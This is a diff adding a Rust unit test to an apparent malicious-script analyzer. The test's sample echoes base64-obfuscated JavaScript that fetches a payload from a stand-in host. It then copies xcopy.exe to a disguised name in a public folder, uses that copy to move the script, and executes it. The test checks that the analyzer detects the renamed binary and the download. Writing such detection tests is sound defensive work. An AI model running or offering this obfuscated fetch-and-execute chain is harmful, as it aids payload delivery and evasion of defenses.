@@ -29087,6 +29087,33 @@ call C:\Temp\original.js"#,
     }
 
     #[test]
+    fn copied_xcopy_alias_preserves_generated_script_content_for_later_execution() {
+        let report = crate::analyze(
+            br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8vY29waWVkLXhjb3B5LmV4YW1wbGUvcGF5bG9hZCc=")) > original.js
+copy C:\Windows\System32\xcopy.exe C:\Users\Public\xc.tmp
+C:\Users\Public\xc.tmp /y /i original.js C:\Temp\
+call C:\Temp\original.js"#,
+            &Config::default(),
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::ManipulatedExec { target, .. }
+                    if target.eq_ignore_ascii_case(r#"C:\Users\Public\xc.tmp"#)
+            )),
+            "copied xcopy alias invocation was not tied back to WindowsUtilManip: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://copied-xcopy.example/payload")
+            }),
+            "copied xcopy generated JS content was not analyzed: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn xcopy_i_directory_hint_without_trailing_slash_preserves_generated_script_content() {
         let report = crate::analyze(
             br#"echo eval(atob("ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8veGNvcHktaS1kaXItaGludC5leGFtcGxlL3BheWxvYWQn")) > original.js
